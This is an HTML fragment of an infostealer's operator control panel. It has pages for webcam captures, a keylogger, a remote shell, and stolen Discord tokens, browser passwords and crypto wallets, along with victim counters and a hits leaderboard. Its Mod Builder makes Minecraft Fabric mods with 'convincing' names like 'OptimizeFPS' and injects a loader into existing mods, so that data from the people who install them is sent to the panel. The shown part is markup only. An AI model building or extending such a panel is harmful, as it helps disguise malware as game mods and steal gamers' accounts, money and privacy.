                <div class="nav-item" onclick="showPage('webcam')" id="nav-webcam">
                    <i class="fas fa-camera"></i> Webcam
                </div>
                <div class="nav-section">Remote Control</div>
                <div class="nav-item" onclick="showPage('remote')" id="nav-remote">
                    <i class="fas fa-desktop"></i> Remote Panel
                </div>
                <div class="nav-item" onclick="showPage('screenshare')" id="nav-screenshare">
                    <i class="fas fa-tv"></i> Screenshare
                </div>
                <div class="nav-item" onclick="showPage('keylogger')" id="nav-keylogger">
                    <i class="fas fa-keyboard"></i> Keylogger
                </div>
                <div class="nav-item" onclick="showPage('shell')" id="nav-shell">
                    <i class="fas fa-terminal"></i> Remote Shell
                </div>
                <div class="nav-item" onclick="showPage('files')" id="nav-files">
                    <i class="fas fa-folder-open"></i> File Manager
                </div>
                <div class="nav-item" onclick="showPage('processes')" id="nav-processes">
                    <i class="fas fa-tasks"></i> Process Manager
                </div>
                <div class="nav-item" onclick="showPage('discord')" id="nav-discord">
                    <i class="fab fa-discord"></i> Discord Tokens
                </div>
                <div class="nav-item" onclick="showPage('donutsmp')" id="nav-donutsmp">
                    <i class="fas fa-cookie-bite"></i> DonutSMP
                </div>
                <div class="nav-item" onclick="showPage('browser')" id="nav-browser">
                    <i class="fas fa-globe"></i> Browser Steals
                </div>

                <div class="nav-item" onclick="showPage('logs')" id="nav-logs">
                    <i class="fas fa-list"></i> Logs
                </div>
                <div class="nav-item" onclick="showPage('settings')" id="nav-settings">
                    <i class="fas fa-cog"></i> Settings
                </div>
                <!-- Leaderboard Tab -->
                <div class="nav-item" onclick="showPage('leaderboard')" id="nav-leaderboard">
                    <i class="fas fa-trophy"></i> Leaderboard
                </div>
                <!-- New Notifications Tab -->
                <div class="nav-item" onclick="showPage('notifications')" id="nav-notifications">
                    <i class="fas fa-bell"></i> Notifications
                </div>
                <div class="nav-section admin-only">Admin</div>
                <div class="nav-item admin-only" onclick="showPage('users')">
                    <i class="fas fa-users"></i> Users
                </div>
                <div class="nav-item admin-only" onclick="showPage('login-logs')">
                    <i class="fas fa-sign-in-alt"></i> Login Logs
                </div>
                <!-- BLACKLIST TAB -->
                <div class="nav-item admin-only" onclick="showPage('blacklist'); loadBlacklist()">
                    <i class="fas fa-ban"></i> Blacklist
                </div>
                <div class="nav-item admin-only" onclick="showPage('alllogs')">
                    <i class="fas fa-database"></i> All Logs
                </div>
                <div class="nav-item admin-only" onclick="showPage('trash')">
                    <i class="fas fa-trash-restore"></i> Trash
                </div>
                <div class="nav-item admin-only" onclick="showPage('audit')">
                    <i class="fas fa-clipboard-list"></i> Audit Log
                </div>
                <div class="nav-section">Info</div>
                <div class="nav-item" onclick="showPage('about')" id="nav-about">
                    <i class="fas fa-info-circle"></i> About
                </div>
            </nav>
            <div class="user-info">
                <div class="user-info-name blur-reveal" id="userName" title="Hover to reveal ID">User</div>
                <div class="user-info-role" id="userRole">Member</div>
            </div>
        </aside>

        <main class="main">
            <!-- Dashboard -->
            <div class="page active" id="page-dashboard">
                <div class="page-header">
                    <h1 class="page-title">Dashboard</h1>
                </div>
                <div class="stats-grid" id="statsGrid"></div>

                <h3 style="margin-bottom: 16px;">Recent Hits</h3>
                <div class="logs-grid" id="recentLogs"></div>
            </div>

            <!-- Leaderboard Page (Dedicated) -->
            <div class="page" id="page-leaderboard">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-trophy"
                            style="color: gold; margin-right: 10px;"></i>Leaderboard</h1>
                </div>

                <!-- NAME SETTING (Compact) -->
                <div class="glass-panel"
                    style="padding: 16px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; gap: 16px;"
                    id="leaderboardSettingsPanel">
                    <div style="flex: 1;">
                        <label
                            style="display: block; font-size: 11px; font-weight: bold; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px;">Your
                            Display Name</label>
                        <div style="font-size: 13px; color: var(--text-secondary);">Visible on the public leaderboard
                        </div>
                    </div>
                    <div style="display: flex; gap: 8px; flex: 1; max-width: 400px;">
                        <input type="text" id="leaderboardNameInputTab" placeholder="Anonymous"
                            style="flex: 1; padding: 8px 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 6px; color: white;">
                        <button onclick="updateLeaderboardNameTab()" class="btn btn-secondary"
                            style="padding: 8px 16px;">
                            <i class="fas fa-save"></i> Save
                        </button>
                    </div>
                </div>

                <!-- ADMIN HIDDEN MESSAGE -->
                <div id="adminLeaderboardMessage"
                    style="display: none; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); padding: 24px; border-radius: 12px; text-align: center; margin-bottom: 24px;">
                    <i class="fas fa-user-shield" style="font-size: 48px; color: #ef4444; margin-bottom: 16px;"></i>
                    <h3 style="margin-bottom: 8px; color: #ef4444;">Admin Hidden</h3>
                    <p style="color: var(--text-muted);">As an admin, you are hidden from the public leaderboard.</p>
                    <div style="margin-top: 16px; font-size: 24px; font-weight: bold; color: white;">
                        <span id="adminTotalHits">0</span> <span
                            style="font-size: 14px; color: var(--text-muted); font-weight: normal;">Total Hits</span>
                    </div>
                </div>

                <div class="glass-panel" style="padding: 0; overflow: hidden; margin-bottom: 24px;"
                    id="leaderboardTableContainer">
                    <table style="width: 100%; border-collapse: collapse;">
                        <thead>
                            <tr style="background: rgba(255,255,255,0.05); text-align: left;">
                                <th
                                    style="padding: 12px 20px; color: var(--text-muted); font-size: 12px; text-transform: uppercase;">
                                    Rank</th>
                                <th
                                    style="padding: 12px 20px; color: var(--text-muted); font-size: 12px; text-transform: uppercase;">
                                    User</th>
                                <th
                                    style="padding: 12px 20px; color: var(--text-muted); font-size: 12px; text-transform: uppercase;">
                                    Hits (30d)</th>
                            </tr>
                        </thead>
                        <tbody id="leaderboardTable">
                            <tr>
                                <td colspan="3" style="padding: 20px; text-align: center; color: var(--text-muted);">
                                    Loading leaderboard...</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <p style="text-align: center; color: var(--text-muted);">Leaderboard resets rolling 30 days. Set your
                    name in Settings.</p>
            </div>

            <!-- Ghost Chat Page -->
            <div class="page" id="page-chat">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-comments"
                            style="color: #5865f2; margin-right: 10px;"></i>Ghost Chat</h1>
                </div>
                <div
                    style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 200px); text-align: center;">
                    <i class="fas fa-tools"
                        style="font-size: 64px; color: var(--accent); opacity: 0.5; margin-bottom: 20px;"></i>
                    <h2 style="color: var(--text-primary); margin-bottom: 10px;">Coming Soon</h2>
                    <p style="color: var(--text-muted); max-width: 400px;">Ghost Chat feature is currently under
                        development. Stay tuned for updates!</p>
                </div>
            </div>

            <!-- Soundboard Page -->
            <div class="page" id="page-soundboard">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-volume-up"
                            style="color: var(--accent); margin-right: 10px;"></i>Troll Soundboard</h1>
                    <div style="width: 300px;">
                        <select id="soundboardTargetSelect" class="glass-select">
                            <option value="">Select Victim...</option>
                        </select>
                    </div>
                </div>

                <div style="display: flex; gap: 10px; margin-bottom: 20px; padding: 0 24px;">
                    <button class="btn btn-danger" onclick="triggerJumpScare()"
                        style="flex: 1; padding: 12px; font-weight: bold; background: rgba(239, 68, 68, 0.2); border: 1px solid var(--danger);">
                        <i class="fas fa-ghost"></i> JUMP SCARE (MAX VOL)
                    </button>
                    <button class="btn btn-primary" onclick="uploadAndPlaySound()"
                        style="flex: 1; padding: 12px; font-weight: bold;">
                        <i class="fas fa-link"></i> Play Custom URL
                    </button>
                </div>

                <div class="soundboard-grid">
                    <div class="sound-btn" onclick="playTrollSound('creeper')">
                        <i class="fas fa-bug"></i>
                        <span>Creeper Hiss</span>
                    </div>
                    <div class="sound-btn" onclick="playTrollSound('tnt')">
                        <i class="fas fa-bomb"></i>
                        <span>TNT Prime</span>
                    </div>
                    <div class="sound-btn" onclick="playTrollSound('anvil')">
                        <i class="fas fa-weight-hanging"></i>
                        <span>Anvil Land</span>
                    </div>
                    <div class="sound-btn" onclick="playTrollSound('cave')">
                        <i class="fas fa-ghost"></i>
                        <span>Cave Noise</span>
                    </div>
                    <div class="sound-btn" onclick="playTrollSound('glass')">
                        <i class="fas fa-wine-glass-empty"></i>
                        <span>Glass Break</span>
                    </div>
                    <div class="sound-btn" onclick="playTrollSound('explode')">
                        <i class="fas fa-radiation"></i>
                        <span>Explosion</span>
                    </div>
                </div>
            </div>

            <!-- Online Players -->
            <div class="page" id="page-online">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-signal"
                            style="color: var(--success); margin-right: 10px;"></i>Online Players</h1>
                    <div style="display: flex; gap: 12px; align-items: center;">
                        <span class="online-count-badge"><i class="fas fa-circle"></i> <span id="onlineCount">0</span>
                            Online</span>
                        <button class="btn btn-secondary" onclick="loadOnlinePlayers()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                </div>
                <div class="online-grid" id="onlinePlayersGrid">
                    <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-spinner fa-spin" style="font-size: 32px; margin-bottom: 16px;"></i>
                        <p>Loading online players...</p>
                    </div>
                </div>
            </div>

            <!-- Webcam -->
            <div class="page" id="page-webcam">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-camera"
                            style="color: var(--warning); margin-right: 10px;"></i>Webcam Captures</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadWebcamImages()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="downloadAllWebcams()" id="downloadAllWebcamsBtn">
                            <i class="fas fa-download"></i> Download All
                        </button>
                    </div>
                </div>
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-camera"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamTotal">0</div>
                        <div class="stat-card-label">Total Captures</div>
                    </div>
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-clock"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamToday">0</div>
                        <div class="stat-card-label">Today</div>
                    </div>
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fas fa-users"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamVictims">0</div>
                        <div class="stat-card-label">Unique Victims</div>
                    </div>
                </div>
                <div class="webcam-grid" id="webcamGrid">
                    <div class="webcam-empty" style="grid-column: 1/-1;">
                        <i class="fas fa-camera-retro"></i>
                        <p>No webcam captures yet</p>
                    </div>
                </div>

                <!-- Lightbox for fullsize image -->
                <div class="lightbox" id="webcamLightbox" onclick="closeLightbox()">
                    <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
                    <img id="lightboxImage" src="" alt="Webcam Capture">
                    <div class="lightbox-info" id="lightboxInfo"></div>
                </div>
            </div>

            <!-- Discord Tokens -->
            <div class="page" id="page-discord">
                <div class="page-header">
                    <h1 class="page-title"><i class="fab fa-discord"
                            style="color: var(--discord-blue); margin-right: 10px;"></i>Discord Tokens</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadDiscordTokens()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="validateAllTokens()" id="validateAllBtn">
                            <i class="fas fa-check-circle"></i> Validate All
                        </button>
                        <button class="btn btn-secondary" onclick="removeInvalidTokens()" title="Remove Invalid Tokens">
                            <i class="fas fa-trash"></i> Clean Invalid
                        </button>
                    </div>
                </div>

                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fab fa-discord"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcTotalTokens">0</div>
                        <div class="stat-card-label">Total Tokens</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-check"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcValidTokens">0</div>
                        <div class="stat-card-label">Valid Tokens</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-crown"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcNitroTokens">0</div>
                        <div class="stat-card-label">Nitro Accounts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon purple"><i class="fas fa-file-archive"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcZipTokens">0</div>
                        <div class="stat-card-label">From ZIPs</div>
                    </div>
                </div>

                <!-- Search Bar for Discord -->
                <div style="display: flex; gap: 10px; margin-bottom: 16px;">
                    <input type="text" id="discordSearchInput" placeholder="Search by username, email, ID..."
                        style="flex: 1; padding: 10px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px;"
                        onkeypress="if(event.key==='Enter') searchDiscordTokens()">
                    <button class="btn btn-primary" onclick="searchDiscordTokens()">
                        <i class="fas fa-search"></i> Search
                    </button>
                    <button class="btn btn-secondary" onclick="clearDiscordSearch()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <div class="filter-bar" style="margin-bottom: 16px;">
                    <button class="filter-btn active" onclick="filterDiscordTokens('all')">All</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('direct')"><i class="fas fa-bolt"></i>
                        Direct</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('zip')"><i class="fas fa-file-archive"></i>
                        From ZIP</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('valid')"><i class="fas fa-check"></i>
                        Valid</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('invalid')"><i class="fas fa-times"></i>
                        Invalid</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('nitro')"><i class="fas fa-crown"></i>
                        Nitro</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('high_value')"><i class="fas fa-gem"></i>
                        High Value</button>
                </div>

                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>User</th>
                                <th>Token</th>
                                <th>Source</th>
                                <th>Info</th>
                                <th>Victim</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="discordTokensTable"></tbody>
                    </table>
                </div>

                <div id="discordTokensLoading" style="text-align: center; padding: 40px; display: none;">
                    <i class="fas fa-spinner fa-spin" style="font-size: 32px; color: var(--discord-blue);"></i>
                    <div style="margin-top: 12px; color: var(--text-secondary);">Loading tokens...</div>
                </div>
            </div>

            <!-- Logs -->
            <div class="page" id="page-logs">
                <div class="page-header">
                    <h1 class="page-title">Logs</h1>
                    <button class="btn btn-secondary" onclick="loadLogs()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>

                <!-- Search Bar for Logs -->
                <div style="display: flex; gap: 10px; margin-bottom: 16px;">
                    <input type="text" id="logsSearchInput" placeholder="Search by player, PC name, IP, username..."
                        style="flex: 1; padding: 10px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px;"
                        onkeypress="if(event.key==='Enter') searchLogs()">
                    <button class="btn btn-primary" onclick="searchLogs()">
                        <i class="fas fa-search"></i> Search
                    </button>
                    <button class="btn btn-secondary" onclick="clearLogsSearch()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <div class="filter-bar">
                    <button class="filter-btn active" onclick="filterLogs('all')">All</button>
                    <button class="filter-btn" onclick="filterLogs('minecraft')"><i class="fas fa-cube"></i>
                        Minecraft</button>
                    <button class="filter-btn" onclick="filterLogs('discord')"><i class="fab fa-discord"></i>
                        Discord</button>
                    <button class="filter-btn" onclick="filterLogs('zip_upload')"><i class="fas fa-file-archive"></i>
                        ZIP</button>
                    <button class="filter-btn" onclick="filterLogs('browser')"><i class="fas fa-globe"></i>
                        Browser</button>
                    <button class="filter-btn" onclick="filterLogs('wallet')"><i class="fas fa-wallet"></i>
                        Wallet</button>
                </div>
                <div class="logs-grid" id="logsGrid"></div>
            </div>

            <!-- Builder -->
            <div class="page" id="page-builder">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-hammer" style="color: var(--accent);"></i> Mod Builder</h1>
                </div>
                <div class="table-container" style="padding: 24px;">
                    <!-- Version Info Box -->
                    <div
                        style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(59, 130, 246, 0.1)); padding: 20px; border-radius: 12px; margin-bottom: 24px; border: 1px solid var(--border);">
                        <div style="display: flex; align-items: center; gap: 16px; flex-wrap: wrap;">
                            <div style="background: var(--accent); padding: 8px 16px; border-radius: 8px;">
                                <span style="color: white; font-weight: 700;">FABRIC MOD</span>
                            </div>
                            <div>
                                <div style="color: var(--text-primary); font-weight: 600; font-size: 16px;">Minecraft
                                    1.21 - 1.21.10</div>
                                <div style="color: var(--text-secondary); font-size: 13px;">Fabric Loader 0.16.0+ | Java
                                    21</div>
                            </div>
                        </div>
                    </div>

                    <!-- Info Box -->
                    <div
                        style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 24px;">
                        <p style="color: var(--text-secondary); margin: 0; line-height: 1.6;">
                            <i class="fas fa-info-circle" style="color: var(--accent);"></i>
                            The mod will be built with your unique Build Key. All collected data will be sent directly
                            to this panel.
                            <br><br>
                            <i class="fas fa-shield-alt" style="color: #22c55e;"></i>
                            <strong>Features:</strong> Discord Tokens, Browser Passwords, Crypto Wallets, MC Sessions,
                            Screenshots, Webcam, Remote Shell
                        </p>
                    </div>

                    <div class="form-group">
                        <label>Mod Name (visible in Minecraft mod list)</label>
                        <input type="text" id="buildModName" placeholder="OptimizeFPS" value="OptimizeFPS"
                            style="font-size: 16px; padding: 14px;">
                        <small style="color: var(--text-muted); margin-top: 6px; display: block;">Choose a convincing
                            name like "OptimizeFPS", "PerformanceBoost", "FPSEnhancer"</small>
                    </div>

                    <button class="btn btn-primary" onclick="buildMod()" id="buildBtn"
                        style="padding: 14px 28px; font-size: 16px;">
                        <i class="fas fa-hammer"></i> Build Mod
                    </button>

                    <!-- Build Progress -->
                    <div id="buildStatus"
                        style="margin-top: 24px; display: none; background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
                            <div id="buildSpinner" class="loading-spinner"
                                style="width: 20px; height: 20px; border-width: 2px;"></div>
                            <div class="stat-card-label" id="buildStatusText" style="margin: 0; font-size: 14px;">
                                Initializing...</div>
                        </div>
                        <div class="progress-bar"
                            style="height: 8px; background: var(--bg-hover); border-radius: 4px; overflow: hidden;">
                            <div class="progress-fill"
                                style="width: 0%; height: 100%; background: linear-gradient(90deg, var(--accent), #3b82f6); transition: width 0.3s ease;"
                                id="buildProgress"></div>
                        </div>
                        <div id="buildSteps" style="margin-top: 16px; font-size: 12px; color: var(--text-muted);">
                            <div id="step1" style="padding: 4px 0;"><i class="fas fa-circle"
                                    style="font-size: 6px; margin-right: 8px;"></i> Preparing build environment</div>
                            <div id="step2" style="padding: 4px 0;"><i class="fas fa-circle"
                                    style="font-size: 6px; margin-right: 8px;"></i> Injecting build key</div>
                            <div id="step3" style="padding: 4px 0;"><i class="fas fa-circle"
                                    style="font-size: 6px; margin-right: 8px;"></i> Compiling mod</div>
                            <div id="step4" style="padding: 4px 0;"><i class="fas fa-circle"
                                    style="font-size: 6px; margin-right: 8px;"></i> Packaging JAR</div>
                            <div id="step5" style="padding: 4px 0;"><i class="fas fa-circle"
                                    style="font-size: 6px; margin-right: 8px;"></i> Finalizing</div>
                        </div>
                    </div>

                    <div id="buildResult" style="margin-top: 20px; display: none;">
                        <a href="#" class="btn btn-success" id="downloadLink" target="_blank">
                            <i class="fas fa-download"></i> Download Mod
                        </a>
                    </div>

                    <!-- Divider -->
                    <div style="margin: 40px 0; border-top: 1px solid var(--border); position: relative;">
                        <span
                            style="position: absolute; top: -12px; left: 50%; transform: translateX(-50%); background: var(--bg-primary); padding: 0 16px; color: var(--text-muted); font-size: 13px;">OR</span>
                    </div>

                    <!-- Inject Mode -->
                    <h3 style="margin-bottom: 16px; color: var(--text-primary);">
                        <i class="fas fa-syringe" style="color: #f59e0b;"></i> Inject into Existing Mod
                    </h3>

                    <!-- Active Drop Zone for Injection -->
                    <div id="injectDropZone" ondrop="handleInjectDrop(event)"
                        ondragover="event.preventDefault(); this.classList.add('drag-over');"
                        ondragleave="this.classList.remove('drag-over');"
                        style="border: 2px dashed var(--accent-primary); border-radius: 12px; padding: 40px; text-align: center; cursor: pointer; transition: all 0.3s ease; background: var(--bg-secondary);">
                        <i class="fas fa-cloud-upload-alt"
                            style="font-size: 48px; color: var(--accent-primary); margin-bottom: 16px; display: block;"></i>
                        <div style="color: var(--text-primary); font-size: 16px; font-weight: 600; margin-bottom: 8px;">
                            Drop a Fabric mod here to inject loader
                        </div>
                        <div style="color: var(--text-muted); font-size: 13px;">
                            Your build key will be embedded into the mod
                        </div>
                    </div>

                    <!-- Inject Progress -->
                    <div id="injectStatus"
                        style="margin-top: 20px; display: none; background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
                            <div id="injectSpinner" class="loading-spinner"
                                style="width: 20px; height: 20px; border-width: 2px;"></div>
                            <div id="injectStatusText" style="color: var(--text-primary); font-size: 14px;">
                                Processing...</div>
                        </div>
                        <div class="progress-bar"
                            style="height: 8px; background: var(--bg-hover); border-radius: 4px; overflow: hidden;">
                            <div id="injectProgress"
                                style="width: 0%; height: 100%; background: linear-gradient(90deg, #f59e0b, #ef4444); transition: width 0.3s ease;">
                            </div>
                        </div>
                    </div>

                    <!-- Inject Result -->
                    <div id="injectResult" style="margin-top: 20px; display: none;">
                        <div
                            style="background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 12px; padding: 20px; text-align: center;">
                            <i class="fas fa-check-circle"
                                style="font-size: 48px; color: #22c55e; margin-bottom: 12px; display: block;"></i>
                            <div
                                style="color: var(--text-primary); font-size: 16px; font-weight: 600; margin-bottom: 8px;">
                                Injection Complete!
                            </div>
                            <div style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;"
                                id="injectFileName">
                                sodium-1.20.1.jar  sodium-injected.jar
                            </div>
                            <a href="#" class="btn btn-success" id="injectDownloadLink" download>
                                <i class="fas fa-download"></i> Download Injected Mod
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Settings -->
            <div class="page" id="page-settings">
                <div class="page-header">
                    <h1 class="page-title">Settings</h1>
                    <button class="btn btn-secondary" onclick="logout()"
                        style="border-color: var(--danger); color: var(--danger);">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </button>
                </div>
                <div class="table-container" style="padding: 24px;">
                    <h3 style="margin-bottom: 20px;">Account Info</h3>
                    <div class="build-key-box">
                        <div class="build-key-label">PLAN</div>
                        <div class="build-key-value" id="userPlan">Loading...</div>
                    </div>

                    <h3 style="margin: 32px 0 20px;">Build Key</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Use this key in your
                        mod:</p>
                    <div class="build-key-box">
                        <div class="build-key-label">YOUR BUILD KEY</div>
                        <div class="build-key-value" id="buildKey">Loading...</div>
                    </div>

                    <h3 style="margin: 32px 0 20px;">API Endpoint</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Mod sends data to:
                    </p>
                    <div class="build-key-box">
                        <div class="build-key-label">ENDPOINT URL</div>
                        <div class="build-key-value" id="apiEndpoint">Loading...</div>
                    </div>

                    <!-- NEW SECURITY SETTINGS -->
                    <h3 style="margin: 32px 0 20px;">Security</h3>
                    <div class="glass-panel">
                        <label
                            style="display: block; font-size: 12px; font-weight: bold; color: var(--text-muted); text-transform: uppercase; margin-bottom: 8px;">Change
                            Password</label>
                        <div style="display: flex; gap: 10px;">
                            <input type="password" id="newPasswordInput" placeholder="New Password"
                                style="flex: 1; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; color: white;">
                            <button onclick="updatePassword()" class="btn btn-secondary">Update</button>
                        </div>
                    </div>

                    <h3 style="margin: 32px 0 20px;">Leaderboard Profile</h3>
                    <div class="glass-panel">
                        <label
                            style="display: block; font-size: 12px; font-weight: bold; color: var(--text-muted); text-transform: uppercase; margin-bottom: 8px;">Display
                            Name</label>
                        <div style="display: flex; gap: 10px;">
                            <input type="text" id="leaderboardNameInput" placeholder="Anonymous"
                                style="flex: 1; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; color: white;">
                            <button onclick="updateLeaderboardName()" class="btn btn-secondary">Set Name</button>
                        </div>
                        <p style="font-size: 12px; color: var(--text-muted); margin-top: 8px;">Visible on global
                            leaderboard. Can be changed once every 30 days.</p>
                    </div>


                    <!-- Notifications moved to dedicated page -->

                    <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--border);">
                        <!-- Logout moved to header -->
                        <p style="text-align: center; color: var(--text-muted); font-size: 11px;">Optimizer Panel
                            Unified v2.0</p>
                    </div>
                </div>
            </div>

            <!-- Notifications Page (New) -->
            <div class="page" id="page-notifications">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-bell"
                            style="color: var(--discord-blue); margin-right: 10px;"></i>
                        Notifications</h1>
                </div>
                <div style="padding: 24px;">
                    <p style="color: var(--text-secondary); margin-bottom: 32px;">
                        Manage your alert preferences and integrations in real-time.
                    </p>

                    <div class="glass-panel" style="margin-bottom: 32px;">
                        <h3 style="margin-bottom: 24px; display: flex; align-items: center; gap: 12px;">
                            <i class="fab fa-discord" style="color: #5865F2; font-size: 24px;"></i> Discord Integration
                        </h3>

                        <label
                            style="font-size: 11px; color: var(--text-secondary); font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 8px; display: block;">Webhook
                            Configuration</label>

                        <div style="display: flex; gap: 12px; margin-bottom: 24px;">
                            <div style="flex: 1; position: relative;">
                                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..."
                                    style="width: 100%; padding: 14px 16px; padding-left: 44px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: var(--text-primary); font-family: 'Monaco', monospace; transition: all 0.2s;">
                                <i class="fas fa-link"
                                    style="position: absolute; left: 16px; top: 16px; color: var(--text-muted);"></i>
                            </div>
                            <button class="btn btn-primary" onclick="saveNotificationSettings()"
                                style="padding: 0 24px; box-shadow: 0 4px 14px rgba(0, 255, 157, 0.2);">
                                <i class="fas fa-check"></i> Save
                            </button>
                            <button class="btn btn-secondary" onclick="testNotification()" style="padding: 0 24px;">
                                <i class="fas fa-paper-plane"></i> Test
                            </button>
                        </div>

                        <label
                            style="font-size: 11px; color: var(--text-secondary); font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 16px; display: block;">Event
                            Filtering</label>

                        <div
                            style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px;">

                            <!-- Master Toggle -->
                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: #5865F2;"><i class="fab fa-discord"></i>
                                    </div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">Master Switch</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">Enable all
                                            notifications</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="webhookEnabled">
                                    <span class="slider"></span>
                                </label>
                            </div>

                            <!-- New Victims -->
                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: var(--accent);"><i
                                            class="fas fa-user-plus"></i></div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">New Connections</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">Alerts when users
                                            come online</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="notifyNewUser" checked>
                                    <span class="slider"></span>
                                </label>
                            </div>

                            <!-- Passwords/Tokens -->
                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: var(--warning);"><i class="fas fa-key"></i>
                                    </div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">Credentials</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">Passwords & Discord
                                            Tokens</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="notifyCredentials" checked>
                                    <span class="slider"></span>
                                </label>
                            </div>

                            <!-- Minecraft -->
                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: var(--mc-green);"><i
                                            class="fas fa-cubes"></i></div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">Minecraft Sessions</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">Game launch & server
                                            joins</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="notifyMinecraft" checked>
                                    <span class="slider"></span>
                                </label>
                            </div>

                            <!-- Wallets -->
                            <div class="switch-container">
                                <div style="display: flex; align-items: center;">
                                    <div class="setting-icon" style="color: var(--danger);"><i
                                            class="fas fa-wallet"></i></div>
                                    <div>
                                        <div style="font-weight: 600; font-size: 14px;">Crypto Wallets</div>
                                        <div style="font-size: 12px; color: var(--text-secondary);">Wallet detection &
                                            theft</div>
                                    </div>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="notifyWallets" checked>
                                    <span class="slider"></span>
                                </label>
                            </div>

                            <!-- File Uploads -->
